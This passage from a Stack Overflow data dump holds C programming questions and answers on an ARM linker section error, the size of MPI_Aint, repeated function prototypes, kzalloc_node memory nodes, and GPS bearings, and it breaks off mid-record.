from the map file.</p>\n\n<p>However, my problem is that I failed to compile with some other functions. There is a linkage error:</p>\n\n<p><strong>arm-none-eabi/bin/ld.exe: final link failed: Section has no contents\ncollect2.exe: error: ld returned 1 exit status</strong></p>\n\n<p><strong>Question:</strong></p>\n\n<p>What is the cause of this linkage error (final link failed: Section has no contents)? I provided some extra informations below.</p>\n\n<p>When I check the code, I see that those functions are used in a constant table and called as a callback function. </p>\n\n<p>This is what I do:</p>\n\n<p>constant_table_file.h:</p>\n\n<pre><code>struct job_element_info_table_s\n {\n    const unsigned int                          (* jeit_job_exec_func)();\n };\n</code></pre>\n\n<p>constant_table_file.c :</p>\n\n<pre><code>extern void __attribute__ ((externally_visible, long_call, noinline, section (\"msmc_program\"))) my_func_2(unsigned int param0);\n\nconst struct job_element_info_table_s job_info_table[] =\n {\n   {\n       (const unsigned int (* )())my_func_2,                                        \n   }\n };\n</code></pre>\n\n<p>another_c_file.c:</p>\n\n<pre><code>void __attribute__ ((externally_visible, long_call, noinline, , section (\"msmc_program\"))) my_func_2(unsigned int param0) {\n//function_body\n}\n</code></pre>\n\n<p>Atrributes \"externally_visible\" and \"long_call\" are my experiments with the situation since the DDR and L3 cache addresses are far to each other. But I had no luck with them or without them.</p>\n\n<p>I also tried to map the constant table \"job_info_table\" into the msmc_program section, but still I get the same error.</p>\n\n<p>Another interesting point is, if I map the function into an arbitrary DDR section, it compiles successfully. Example:</p>\n\n<pre><code>void __attribute__ ((externally_visible, long_call, noinline, , section (\"arbitrary_sec_123\"))) my_func_2(unsigned int param0) {\n//function_body\n}\n</code></pre>\n\n<p>In this example, it automatically creates a section in DDR called arbitrary_sec_123 and maps the function to this section.</p>\n\n<p>My compile options are:</p>\n\n<pre><code># Compile options.\nC_OPTS =    -Wall \\\n-Werror=uninitialized \\\n-Werror=maybe-uninitialized \\\n-Werror=overflow \\\n-mcpu=cortex-a15 \\\n-mtune=cortex-a15 \\\n-mabi=aapcs \\\n-mapcs \\\n-mfpu=neon \\\n-ftree-vectorize \\\n-ftree-vectorizer-verbose=2 \\\n-mfloat-abi=hard \\\n-O3 \\\n-g \\\n-flto \\\n-marm \\\n-fno-gcse \\\n-fno-strict-aliasing \\\n-fno-delete-null-pointer-checks \\\n-fno-strict-overflow \\\n-fuse-linker-plugin \\\n-falign-functions=64\n\n# Linker options.\nL_OPTS = -nostartfiles \\\n-static \\\n-Wl,--gc-sections \\\n-Wl,-Map,$(BUILD_DIR)/$(PROJ).map \\\n-mcpu=cortex-a15 \\\n-mtune=cortex-a15 \\\n-mabi=aapcs \\\n-mapcs \\\n-mfpu=neon \\\n-ftree-vectorize \\\n-ftree-vectorizer-verbose=2 \\\n-mfloat-abi=hard \\\n-O3 \\\n-g \\\n-flto \\\n-marm \\\n-fno-gcse \\\n-fno-strict-aliasing \\\n-fno-delete-null-pointer-checks \\\n-fno-strict-overflow \\\n-fuse-linker-plugin \\\n-falign-functions=64\n\nLIBS = -lgcc -lc -lm -lrdimon\n</code></pre>\n"}, {"tags": ["c", "mpi"], "comments": [{"owner": {"reputation": 53, "user_id": 6136411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ff0f0aa7580d165ffae55ba16867495?s=128&d=identicon&r=PG&f=1", "display_name": "Robin Huart", "link": "https://stackoverflow.com/users/6136411/robin-huart"}, "edited": false, "score": 0, "creation_date": 1459412980, "post_id": 36317835, "comment_id": 60278458, "body": "EDIT: For anybody interested, I figured out after Gilles&#39; reply that there is no portability problem with <code>MPI_Aint</code> being a C type. We never read/write <code>MPI_Aint</code>s, and we only use their value to define the structure (which does not depend on their size in memory). Hence no need to create a uniform (portable) <code>MPI_Type</code> for them."}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 6136411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ff0f0aa7580d165ffae55ba16867495?s=128&d=identicon&r=PG&f=1", "display_name": "Robin Huart", "link": "https://stackoverflow.com/users/6136411/robin-huart"}, "edited": false, "score": 1, "creation_date": 1459405153, "post_id": 36325343, "comment_id": 60273728, "body": "Indeed, after checking I found the typedef in my mpi.h, it comes as a ptrdiff_t... IMHO it is quite confusing to have <code>MPI_Double</code> look like <code>MPI_Aint</code> whereas one is a <code>MPI_type</code>but not the other. But anyway, thank you very much for your answer !"}, {"owner": {"reputation": 9958, "user_id": 225186, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/dbc60362bf2df08202ff198e00085a5c?s=128&d=identicon&r=PG", "display_name": "alfC", "link": "https://stackoverflow.com/users/225186/alfc"}, "reply_to_user": {"reputation": 53, "user_id": 6136411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ff0f0aa7580d165ffae55ba16867495?s=128&d=identicon&r=PG&f=1", "display_name": "Robin Huart", "link": "https://stackoverflow.com/users/6136411/robin-huart"}, "edited": false, "score": 0, "creation_date": 1520668324, "post_id": 36325343, "comment_id": 85418262, "body": "@RobinHuart If I understand correctly and for more confusion there is even a <code>MPI_AINT</code> datatype that describes an <code>MPI_Aint</code>. <a href=\"https://trac.mpich.org/projects/mpich/browser/src/include/mpi.h.in?rev=fd6627a1bf6cdbe629defe77db231558948c48dd\" rel=\"nofollow noreferrer\">trac.mpich.org/projects/mpich/browser/src/include/&hellip;</a>"}], "tags": [], "owner": {"reputation": 8381, "user_id": 5239503, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/MqgeX.jpg?s=128&g=1", "display_name": "Gilles", "link": "https://stackoverflow.com/users/5239503/gilles"}, "is_accepted": true, "score": 3, "last_activity_date": 1459404127, "creation_date": 1459404127, "answer_id": 36325343, "question_id": 36317835, "link": "https://stackoverflow.com/questions/36317835/size-of-mpi-aint/36325343#36325343", "title": "Size of MPI_Aint?", "body": "<p><code>MPI_Aint</code> isn't a <code>MPI_Type</code> such as <code>MPI_INT</code>, <code>MPI_DOUBLE</code> or what you create with <code>MPI_Type_create_hindexed()</code>, <code>MPI_Aint</code> is a type in the C language, like <code>int</code>, <code>double</code> or a <code>struct</code>. In fact I suspect that most of the time <code>MPI_Aint</code> will simply be define as a <code>typedef</code> large enough to store what it needs to. Most probably, it will be define as either <code>typedef long MPI_Aint;</code> or <code>typedef long long MPI_Aint;</code>.</p>\n\n<p>Therefore, your approach for allocating your array is correct in using <code>sizeof()</code> instead of <code>MPI_Type_size()</code>.</p>\n"}], "owner": {"reputation": 53, "user_id": 6136411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ff0f0aa7580d165ffae55ba16867495?s=128&d=identicon&r=PG&f=1", "display_name": "Robin Huart", "link": "https://stackoverflow.com/users/6136411/robin-huart"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 431, "favorite_count": 2, "accepted_answer_id": 36325343, "answer_count": 1, "score": 5, "last_activity_date": 1459404127, "creation_date": 1459365638, "question_id": 36317835, "link": "https://stackoverflow.com/questions/36317835/size-of-mpi-aint", "title": "Size of MPI_Aint?", "body": "<p>I have a simple question about <code>MPI_Aint</code>, but I didn't find any answer anywhere. For some reason, <code>MPI_Type_size(MPI_Aint)</code> doesn't work (it does not look like classical datatypes, e.g. <code>MPI_Double</code> or <code>MPI_Int</code>), at least with OpenMPI 1.8.4 and 1.10.1 but I don't think it's an OpenMPI problem.</p>\n\n<p>I have to create a type with <code>MPI_Type_create_hindexed()</code> and to allocate the <code>array_of_displacements</code> array dynamically. After computing a size <code>N</code>, I wrote</p>\n\n<pre><code>MPI_Aint* disps = (MPI_Aint*) malloc(N*sizeof(MPI_Aint)) ;\n</code></pre>\n\n<p>instead of </p>\n\n<pre><code>int mpiAintSize ;\nMPI_Type_size(MPI_Aint, &amp;mpiAintSize) ;\nMPI_Aint* disps = (MPI_Aint*) malloc(N*mpiAintSize) ;\n</code></pre>\n\n<p>because of this problem. sizeof() will do the job as long as I'm lucky and I don't need portability (this array will be used to write/read big files with MPI-I/O).</p>\n\n<p>But I would like to know: what is the clean and portable way to allocate my <code>disps</code> array ? What did I miss about MPI_Aint ?</p>\n"}, {"tags": ["c", "prototype", "language-lawyer", "declaration", "c99"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1459364738, "post_id": 36317534, "comment_id": 60258492, "body": "C standard is C11. Don&#39;t use invalid outdated versions of the standard for discussions."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 1, "creation_date": 1459364834, "post_id": 36317534, "comment_id": 60258554, "body": "you could tag it c99 instead of c, if you&#39;re really using c99"}, {"owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "edited": false, "score": 1, "creation_date": 1459364983, "post_id": 36317534, "comment_id": 60258646, "body": "<code>if you&#39;re really using c99</code> - I heard that most compilers still didn&#39;t implement all <code>C99</code> features let alone <code>C11</code> so I wonder what you mean by &quot;really using C99&quot;"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1459365170, "post_id": 36317534, "comment_id": 60258761, "body": "You are allowed to repeat declarations as long as they&#39;re equivalent.  For example, given <code>typedef int int32_2;</code>, both <code>int function(int, int);</code> and <code>int32_t function(int, int32_t);</code> are equivalent."}, {"owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1459365327, "post_id": 36317534, "comment_id": 60258848, "body": "@JonathanLeffler: is <code>equivalent</code> synonym to <code>compatible</code> in C language spec?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459365363, "post_id": 36317534, "comment_id": 60258874, "body": "In fact, you can declare the same object or function as many times as you like, provided that the declarations are all <i>compatible</i> (as defined by the standard).  Equivalency is not required."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459365413, "post_id": 36317534, "comment_id": 60258901, "body": "@user1042840: The C tag is about standard C. Which is undoubtfully C11. And there are still compilers which only support K&amp;R-C. As well as modern compilers like gcc and clang which implement C11 language (they don&#39;t provide the library anyway). Note that MS has announced to support C11, but not C99."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459365419, "post_id": 36317534, "comment_id": 60258906, "body": "... which include global variables too. <code>int i; int i;</code> is OK."}, {"owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459365597, "post_id": 36317534, "comment_id": 60259007, "body": "@WeatherVane: I think it&#39;s called <code>tentative definition</code>. It&#39;s not the same as multiple declarations. I didn&#39;t find any discussion about <code>tentative definition</code> for functions."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1459365813, "post_id": 36317534, "comment_id": 60259144, "body": "I will be misusing &#39;equivalent&#39; if it is a term in the standard.  I was intending to use it colloquially. I won&#39;t have time to chase the details through the standard fir a number of hours."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1459366372, "post_id": 36317534, "comment_id": 60259537, "body": "@Weather-Vane, how is that across compilation units? Multiple storage locations will be allocated that clash at link time?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459366505, "post_id": 36317534, "comment_id": 60259633, "body": "@PaulOgilvie within a single compilation unit. Only one of the declarations may have a value defined (even if the same value)."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459366955, "post_id": 36317534, "comment_id": 60259891, "body": "@user1042840, a &quot;tentative definition&quot; is not the same thing as multiple declarations.  The two can co-occur, or not.  Specifically, &quot;A declaration of an identifier for an object that has file scope without an initializer, and without a storage-class specifier or with the storage-class specifier <code>static</code>, constitutes a <i>tentative definition</i>&quot; (C2011, 6.9.2/2).  This has nothing to do with whether declarations are duplicated."}, {"owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459367197, "post_id": 36317534, "comment_id": 60260040, "body": "@JohnBollinger: I know it&#39;s not the same, I just said that :) It was my first thought though."}], "answers": [{"comments": [{"owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "edited": false, "score": 0, "creation_date": 1459367118, "post_id": 36318081, "comment_id": 60259992, "body": "Good point about repeated prototype in a definition - I didn&#39;t even think about that!"}, {"owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "edited": false, "score": 0, "creation_date": 1459367463, "post_id": 36318081, "comment_id": 60260177, "body": "One more thing - if you have time, can you confirm that my thinking about what parts in <code>C99</code> or <code>C11</code> standard describe that behavior is correct or should I look for an explanation in a very different part of the standard? Recently I started to enjoy reading official standards, they seem very hard to understand at the beginning the more you read the more you understand."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459367994, "post_id": 36318081, "comment_id": 60260480, "body": "I <i>think</i> <code>void foo() { ... }</code> as a function <i>definition</i> is the same as <code>void foo(void) { ... }</code>  whereas the <i>declaration</i> <code>void foo()</code> is not the same as <code>void foo(void)</code>. (C99).  Your thoughts or is this outside this post&#39;s area?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459369596, "post_id": 36318081, "comment_id": 60261393, "body": "@chux, in both C99 and C2011, <code>foo()</code> is a function declarator with an empty [parameter] <i>identifier list</i>, whereas <code>foo(void)</code> is a function declarator with a one-element <i>parameter type list</i> (that one element being anonymous).  When these appear as part of a function definition, they have the same meaning with respect to the function&#39;s parameters, but only a declarator that includes a parameter type list serves as a prototype (C99 6.9.1/7; C2011 6.9.1/7; and elsewhere), whether in a function definition or not.  Of course, outside a function definition these have different meaning."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459369628, "post_id": 36318081, "comment_id": 60261412, "body": "@chux, that also means that a K&amp;R-style definition of a function that takes parameters does not serve as a prototype for that function.  I actually worded my answer rather carefully to be accurate in that respect without delving into the issue."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 4, "last_activity_date": 1459366453, "creation_date": 1459366453, "answer_id": 36318081, "question_id": 36317534, "link": "https://stackoverflow.com/questions/36317534/are-multiple-identical-prototypes-legal/36318081#36318081", "title": "Are multiple identical prototypes legal?", "body": "<p>Multiple identical prototypes are legal, and in fact common, because it is typical in modern C for a function definition to comprise a prototype for that function, and for there also to be a prototype for the function in scope from inclusion of a header file.  That is, given</p>\n\n<p><strong>foo.h</strong>:</p>\n\n<pre><code>void foo(int x);\n</code></pre>\n\n<p><strong>foo.c</strong>:</p>\n\n<pre><code>#include \"foo.h\"\n\nvoid foo(int x) {\n    printf(\"%d\\n\", x);\n}\n\n/* ... */\n</code></pre>\n\n<p>there are two identical prototypes for <code>foo()</code> in scope in the body of function <code>foo</code>'s definition and throughout the rest of the file.  This is fine.</p>\n\n<p>It is also ok to have multiple declarations of the same object or function that are not <em>identical</em>, as long as they are <em>compatible</em>.  For example, the\ndeclaration</p>\n\n<pre><code>void foo();\n</code></pre>\n\n<p>declares <code>foo</code> as a function taking unspecified parameters and returning nothing.  This declaration is compatible with the ones already present in <code>foo.c</code> and <code>foo.h</code>, and it could be added to either one or both of those files with zero additional effect.</p>\n\n<p>And this all applies to objects (variables), too, where some applications are quite common.  For example, if you want to declare a global variable that is accessed from multiple files, then it is common to put a declaration of that variable in a header file.  The C source file containing and the definition of that variable -- which is also a declaration -- typically <code>#include</code>s the header, yielding two declarations:</p>\n\n<p><strong>global.h</strong>:</p>\n\n<pre><code>extern int global;\n</code></pre>\n\n<p><strong>global.c</strong>:</p>\n\n<pre><code>#include \"global.h\"\n\nint global = 42;\n</code></pre>\n\n<p>Or there is the case of forward declaration of compound data types:</p>\n\n<pre><code>struct one;\n\nstruct two {\n    struct one *my_one;\n    struct two *next;\n};\n\nstruct one {\n    struct two *my_two;\n}\n</code></pre>\n\n<p>Note the multiple compatible, but not identical, declarations of <code>struct one</code>.  This particular set of data structures cannot be declared at all without multiple declaration of one of the types.</p>\n"}], "owner": {"reputation": 1825, "user_id": 1042840, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/159d59ce9a4b6bacc2c1a21fc2abce6d?s=128&d=identicon&r=PG", "display_name": "user1042840", "link": "https://stackoverflow.com/users/1042840/user1042840"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 875, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1459366453, "creation_date": 1459364689, "last_edit_date": 1459365521, "question_id": 36317534, "link": "https://stackoverflow.com/questions/36317534/are-multiple-identical-prototypes-legal", "title": "Are multiple identical prototypes legal?", "body": "<p>The following code does not emit any warnings when compiled with both <code>gcc</code> and <code>clang</code> on <code>Linux x64</code>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid foo(void);\n\nvoid foo(void);\n\nvoid foo(void);\n\nint main(void)\n{\n    return 0;\n}\n</code></pre>\n\n<p>IMO, it's legal according to the following snippets from C99:</p>\n\n<blockquote>\n  <p>All declarations that refer to the same object or function shall have\n  compatible type; otherwise, the behavior is undefined.</p>\n  \n  <p>(...)</p>\n  \n  <p>For two function\n  types to be compatible, both shall specify compatible return types</p>\n  \n  <p>(...) </p>\n  \n  <p>Moreover, the parameter type lists, if both are present, shall agree in the\n  number of parameters and in use of the ellipsis terminator; corresponding\n  parameters shall have compatible types.</p>\n  \n  <p>(...)</p>\n  \n  <p>Two types have compatible type if their types are the same.</p>\n</blockquote>\n\n<p>Am I right? I want to make sure it is not UB and that my understanding is correct.</p>\n"}, {"tags": ["c", "linux", "memory-management", "linux-kernel", "dynamic-memory-allocation"], "answers": [{"comments": [{"owner": {"reputation": 1313, "user_id": 2278623, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/rna82.jpg?s=128&g=1", "display_name": "Alex Parker", "link": "https://stackoverflow.com/users/2278623/alex-parker"}, "edited": false, "score": 0, "creation_date": 1459365748, "post_id": 36317622, "comment_id": 60259103, "body": "So in the deadline scheduler situation, the dd pointer is allocated in the same node as the request_queue, correct?"}, {"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "reply_to_user": {"reputation": 1313, "user_id": 2278623, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/rna82.jpg?s=128&g=1", "display_name": "Alex Parker", "link": "https://stackoverflow.com/users/2278623/alex-parker"}, "edited": false, "score": 0, "creation_date": 1459365951, "post_id": 36317622, "comment_id": 60259244, "body": "I was focused on the question &quot;what is a node?&quot;.  But I believe the answer is &quot;yes - you are correct&quot;."}], "tags": [], "owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "is_accepted": true, "score": 2, "last_activity_date": 1459364965, "creation_date": 1459364965, "answer_id": 36317622, "question_id": 36317488, "link": "https://stackoverflow.com/questions/36317488/what-is-the-memory-node-in-kzalloc-node-in-the-linux-kernel/36317622#36317622", "title": "What is the memory node in kzalloc_node in the Linux kernel", "body": "<p>There's a very good description here:</p>\n\n<blockquote>\n  <p><a href=\"https://www.kernel.org/doc/gorman/html/understand/understand009.html\" rel=\"nofollow\">https://www.kernel.org/doc/gorman/html/understand/understand009.html</a></p>\n  \n  <p>...the function alloc_pages() calls numa_node_id() to return the\n  logical ID of the node associated with the current running CPU. This\n  NID is passed to _alloc_pages() which calls NODE_DATA() with the NID\n  as a parameter. </p>\n  \n  <p>On UMA architectures, this will unconditionally result\n  in contig_page_data being returned but NUMA architectures instead set\n  up an array which NODE_DATA() uses NID as an offset into. In other\n  words, architectures are responsible for setting up a CPU ID to NUMA\n  memory node mapping. </p>\n  \n  <p>This is effectively still a node-local allocation\n  policy as is used in 2.4 but it is a lot more clearly defined.</p>\n</blockquote>\n\n<p>See also: <a href=\"https://en.wikipedia.org/wiki/Non-uniform_memory_access\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Non-uniform_memory_access</a></p>\n"}], "owner": {"reputation": 1313, "user_id": 2278623, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/rna82.jpg?s=128&g=1", "display_name": "Alex Parker", "link": "https://stackoverflow.com/users/2278623/alex-parker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 912, "favorite_count": 1, "accepted_answer_id": 36317622, "answer_count": 1, "score": 3, "last_activity_date": 1459364965, "creation_date": 1459364489, "last_edit_date": 1459364901, "question_id": 36317488, "link": "https://stackoverflow.com/questions/36317488/what-is-the-memory-node-in-kzalloc-node-in-the-linux-kernel", "title": "What is the memory node in kzalloc_node in the Linux kernel", "body": "<p>I do not understand what the memory node is in the kzalloc_node function. The description says, \"allocate zeroed memory from a particular memory node.\" But what is a memory node? I am specifically looking at a portion of the deadline I/O scheduler (shown below).</p>\n\n<pre><code>static int deadline_init_queue(struct request_queue *q, struct elevator_type *e)\n{\n    struct deadline_data *dd;\n\n    ...\n\n    dd = kzalloc_node(sizeof(*dd), GFP_KERNEL, q-&gt;node);\n\n    ...\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "gps", "haversine"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 2, "creation_date": 1459364252, "post_id": 36317018, "comment_id": 60258163, "body": "You&#39;re out to lunch. Assuming bearings that are in opposite directions, subtracting the smaller bearing from the larger bearing should yield 180. Adding the bearings results in a number between 180 and 540. For example, 45 and 225 are opposites, the sum is 270, but the difference is 180. Also, when moving along a great circle, the bearing is not constant. So starting from LA, you begin with a north-eastern direction, and end going almost due east. Starting in NY, you begin almost due west, but end in a south-western path."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1459364487, "post_id": 36317018, "comment_id": 60258317, "body": "On the curved earth surface, I do not think the bearings need to be 180 degree complements."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1459364853, "post_id": 36317018, "comment_id": 60258568, "body": "In addition to opposite directions differing by 180&#176;, the bearing as angle to the meridians changes as you move along the great circles, so that the incoming bearing isn&#39;t the opposite of the outgoing bearing, <a href=\"http://www.movable-type.co.uk/scripts/latlong.html\" rel=\"nofollow noreferrer\">see here</a>. The notion of opposite angles comes from mentally imagining the shortest distance as a straight line on a map, but the shortest path isn&#39;t a straight line in most projections."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 6030829, "user_type": "registered", "profile_image": 